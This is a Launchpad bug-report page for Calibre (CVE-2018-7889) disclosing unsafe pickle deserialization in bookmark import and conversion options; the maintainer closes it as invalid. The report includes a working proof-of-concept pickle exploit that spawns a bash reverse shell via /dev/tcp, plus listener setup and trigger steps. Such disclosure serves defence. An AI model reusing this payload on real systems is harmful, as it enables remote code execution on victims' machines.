<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/calibre/+bug/1753870/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1753870 “Code Execution in Calibre as a resut of the use of...” : Bugs : calibre</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1753870" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1753870/bug.atom" title="Bug 1753870 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="A malicious pickle file can be used to trigger remote code execution in
Calibre E-book Manager.

# Affected Versions

This vulnerability affects all operating systems Calibre supports and is
present in the latest version (3.18) of the application.

# Description

Calibre E-book Manager uses the Python `pickle` module for serialization in
multiple places. This is a dangerous pattern because the deserialization of
malicious pickle data can result in the execution of arbitrary Python code.

Ther..." />
      <meta property="og:description" content="A malicious pickle file can be used to trigger remote code execution in
Calibre E-book Manager.

# Affected Versions

This vulnerability affects all operating systems Calibre supports and is
present in the latest version (3.18) of the application.

# Description

Calibre E-book Manager uses the Python `pickle` module for serialization in
multiple places. This is a dangerous pattern because the deserialization of
malicious pickle data can result in the execution of arbitrary Python code.

Ther..." />
    

    
    
      <meta property="og:title" content="Bug #1753870 “Code Execution in Calibre as a resut of the use of...” : Bugs : calibre" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1753870" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["apple-driver", "catalogs", "documentation", "fb2-output", "kobo-driver", "pdb-input", "pdb-output", "pdf-input", "pdf-output", "preprocessing", "rb-input", "rb-output", "rtf-input", "rtf-output", "txt-input", "txt-output", "website"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/calibre/+bug/1753870/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/calibre"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49153010/library64.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/calibre">calibre</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/calibre">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/calibre">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/calibre">Bugs</a></li>
      
      
    
    
      
      <li class="specifications"><a href="https://blueprints.launchpad.net/calibre">Blueprints</a></li>
      
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/calibre">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/calibre">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    Code Execution in Calibre as a resut of the use of Pickle
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1753870 reported by
      <a href="https://launchpad.net/~ayrx" class="sprite person">-</a>
      <time title="2018-03-07 01:45:27 UTC" datetime="2018-03-07T01:45:27.841955+00:00">on 2018-03-07</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">256</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary2355349">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/calibre/+bug/1753870/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2355349">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/calibre">calibre</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/calibre/+bug/1753870/+editstatus" style="float: left" class="value statusINVALID">Invalid</a>
          <a href="https://bugs.launchpad.net/calibre/+bug/1753870/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2355349">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2355349">
     <td colspan="7"><form action="/calibre/+bug/1753870/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/calibre">calibre</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~ayrx" class="sprite person">-</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2018-03-07 01:45:27 UTC" datetime="2018-03-07T01:45:27.841955+00:00">2018-03-07</time>
      </td>
    </tr>
    
    
    
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2018-03-07 03:05:35 UTC" datetime="2018-03-07T03:05:35.420245+00:00">2018-03-07</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="calibre.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" id="calibre.target.option.package" name="calibre.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="calibre.target.distribution" name="calibre.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="calibre.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="calibre.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="calibre.target.package"
                         name="calibre.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;calibre.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('calibre.target.package');
              var select_menu = Y.DOM.byId('calibre.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-calibre-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "header": "Select a package", "vocabulary_filters": [], "input_element": "calibre.target.package", "show_remove_button": false, "show_assign_me_button": false, "step_title": "Search by name", "show_widget_id": "show-widget-calibre-target-package", "selected_value": null, "selected_value_metadata": null, "remove_team_text": "Remove team", "assign_me_text": "Pick me", "show_create_team": false, "vocabulary_name": "DistributionPackage"};
        var show_widget_id = 'show-widget-calibre-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="calibre.target.option.product" name="calibre.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="calibre" id="calibre.target.product"
                         name="calibre.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;calibre.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('calibre.target.product');
              var select_menu = Y.DOM.byId('calibre.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-calibre-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "header": "Select a project", "vocabulary_filters": [], "input_element": "calibre.target.product", "show_remove_button": false, "show_assign_me_button": false, "step_title": "Search", "show_widget_id": "show-widget-calibre-target-product", "selected_value": "calibre", "selected_value_metadata": null, "remove_team_text": "Remove team", "assign_me_text": "Pick me", "show_create_team": false, "vocabulary_name": "Product"};
        var show_widget_id = 'show-widget-calibre-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="calibre.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="calibre.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="calibre.status" name="calibre.status" size="1" >
<option selected="selected" value="Invalid">Invalid</option>
</select>
</div>
<input name="calibre.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceUNDECIDED">Undecided</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="calibre.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="calibre.assignee.assign_to_nobody" name="calibre.assignee.option" value="calibre.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="calibre.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="calibre.assignee.assign_to_me" name="calibre.assignee.option" value="calibre.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="calibre.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="calibre.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="calibre.comment_on_change" name="calibre.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/calibre/+bug/1753870/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/calibre/+bug/1753870/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/calibre/+bug/1753870/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>A malicious pickle file can be used to trigger remote code execution in<br />
Calibre E-book Manager.</p>
<p># Affected Versions</p>
<p>This vulnerability affects all operating systems Calibre supports and is<br />
present in the latest version (3.18) of the application.</p>
<p># Description</p>
<p>Calibre E-book Manager uses the Python `pickle` module for serialization in<br />
multiple places. This is a dangerous pattern because the deserialization of<br />
malicious pickle data can result in the execution of arbitrary Python code.</p>
<p>There are two specific functionality in Calibre where the use of pickle can be<br />
leveraged by an attacker to obtain code execution by social engineering a<br />
target.</p>
<p>Firstly, Calibre allows users to export and import bookmark data from a<br />
specific ebook. `src/calibre/<wbr />gui2/viewer/<wbr />bookmarkmanager<wbr />.py` contains code that<br />
imports a previously exported file containing bookmark information. This file<br />
data is directly passed into `cPickle.load`.</p>
<p>```<br />
206 files = choose_files(self, &#x27;export-<wbr />viewer-<wbr />bookmarks&#x27;<wbr />, _(&#x27;Import bookmarks&#x27;),<br />
207     filters=[(_(&#x27;Saved bookmarks&#x27;), [&#x27;pickle&#x27;])], all_files=False, select_<wbr />only_single_<wbr />file=True)<br />
208        if not files:<br />
209            return<br />
210        filename = files[0]<br />
211<br />
212        imported = None<br />
213        with open(filename, &#x27;rb&#x27;) as fileobj:<br />
214            imported = cPickle.<wbr />load(fileobj)<br />
```</p>
<p>Secondly, Calibre stores metadata in `metadata.db`, a SQLite database file.<br />
`src/calibre/<wbr />db/backend.<wbr />py` contains code that deserializes data contained in<br />
one of the tables of the database. This code can be triggered by attempting a<br />
file format conversion of an ebook.</p>
<p>```<br />
1694 def conversion_<wbr />options(<wbr />self, book_id, fmt):<br />
1695     for (data,) in self.conn.<wbr />get(&#x27;SELECT data FROM conversion_options WHERE book=? AND format=?&#x27;, (book_id, fmt.upper())):<br />
1696         if data:<br />
1697             return cPickle.<wbr />loads(bytes(<wbr />data))<br />
```</p>
<p># Proof of Concept</p>
<p>For the proof of concept, we will use a malicious pickle exploited by the below<br />
`poc.py`.</p>
<p>```python<br />
import cPickle<br />
import os<br />
import base64<br />
import pickletools</p>
<p>class Exploit(object):<br />
&nbsp;&nbsp;&nbsp;&nbsp;def __reduce__(self):<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (os.system, ((&quot;bash -i &gt;&amp; /dev/tcp/<wbr />127.0.0.<wbr />1/8000 0&gt;&amp;1&quot;),))</p>
<p>with open(&quot;exploit.<wbr />pickle&quot;<wbr />, &quot;wb&quot;) as f:<br />
&nbsp;&nbsp;&nbsp;&nbsp;cPickle.<wbr />dump(Exploit(<wbr />), f, cPickle.<wbr />HIGHEST_<wbr />PROTOCOL)<br />
```</p>
<p>The exploit will make a reverse shell to a listener on 127.0.0.1:8000, so we<br />
set that up using `ncat`.</p>
<p>```<br />
$ ncat -nlvp 8000</p>
<p>Ncat: Version 7.60 ( <a rel="nofollow" href="https://nmap.org/ncat">https:/<wbr />/nmap.org/<wbr />ncat</a> )<br />
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.<br />
Ncat: SHA-1 fingerprint: 125E F683 5DA6 153A 6E26 E957 0C92 4706 2596 347C<br />
Ncat: Listening on :::8000<br />
Ncat: Listening on 0.0.0.0:8000<br />
```</p>
<p>For the first vulnerability, we open an ebook and navigate to the &quot;Bookmarks&quot;<br />
icon on the left of the screen and click the &quot;Show/hide bookmarks&quot; menu item.<br />
We then click the &quot;Import&quot; button on the bookmarks pane and select the<br />
generated `exploit.pickle` file. This should trigger a reverse shell on our<br />
listener.</p>
<p>For the second vulnerability, we click on the arrow on the right of the<br />
&quot;Calibre Library&quot; icon and click the &quot;Export/import all calibre data. We then<br />
click &quot;Import previously exported data&quot; and select the folder containing the<br />
`part-0001.<wbr />calibre-<wbr />data` file (uploaded as an attachment). The file contains<br />
the contents of `exploit.pickle` stored in the `data` column of the<br />
`conversion_<wbr />options` table. Once the data has been exported, we right click the<br />
ebook in the library and select<br />
&nbsp;&quot;Convert books-&gt;Convert individually&quot; This should trigger a reverse shell on<br />
our listener.</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            
          </span>
          <span id="tag-list">
          </span>
          <a href="+edit" title="Add tags" id="tags-trigger" class="sprite add">Add tags</a>
          
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2018-7889" title="gui2/viewer/bookmarkmanager.py in Cal...">2018-7889</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ayrx" class="sprite person">- (ayrx)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T01:45:27.841955+00:00" title="2018-03-07 01:45:27 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/1753870/+attachment/5071173/+files/part-0001.calibre-data">part-0001.calibre-data</a>
        <a class="sprite edit action-icon" href="/calibre/+bug/1753870/+attachment/5071173">Edit</a>
        (722.1 KiB,
        application/octet-stream)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ayrx" class="sprite person">- (ayrx)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T01:52:22.724577+00:00" title="2018-03-07 01:52:22 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>While this report directly addresses the two areas where a user of Calibre can be potentially tricked into directly triggering a malicious pickle, there is a very dangerous pattern of using pickle throughout the entire codebase. This should be modified in favour of safer serialisation methods like JSON.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">While this report directly addresses the two areas where a user of Calibre can be potentially tricked into directly triggering a malicious pickle, there is a very dangerous pattern of using pickle throughout the entire codebase. This should be modified in favour of safer serialisation methods like JSON. </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T03:05:31.796908+00:00" title="2018-03-07 03:05:31 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>calibre does not claim to be secure against a threat that can modify data in the users computer. If you can do that, it is already game over in many many ways, for instance, you can set CALIBRE_<wbr />DEVELOP_<wbr />FROM and have calibre execute arbitrary python, or you can install a plugin in the calibre config directory and once again execute arbitrary code. Or you could just modify the calibre program files themselves and once again execute arbitrary code (though this last one typically requires root, unless running calibre portable or similar).</p>
<p>If there is pickle involved in some code path that can be triggered by opening untrusted data, such as an ebook, then that would indeed by a security issue. calibre library exports and config files are explicitly not untrusted data. If you find such a code path involving pickle with untrusted data, I&#x27;ll be happy to fix it.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">calibre does not claim to be secure against a threat that can modify data in the users computer. If you can do that, it is already game over in many many ways, for instance, you can set CALIBRE_DEVELOP_FROM and have calibre execute arbitrary python, or you can install a plugin in the calibre config directory and once again execute arbitrary code. Or you could just modify the calibre program files themselves and once again execute arbitrary code (though this last one typically requires root, unless running calibre portable or similar).

If there is pickle involved in some code path that can be triggered by opening untrusted data, such as an ebook, then that would indeed by a security issue. calibre library exports and config files are explicitly not untrusted data. If you find such a code path involving pickle with untrusted data, I'll be happy to fix it.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Invalid
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
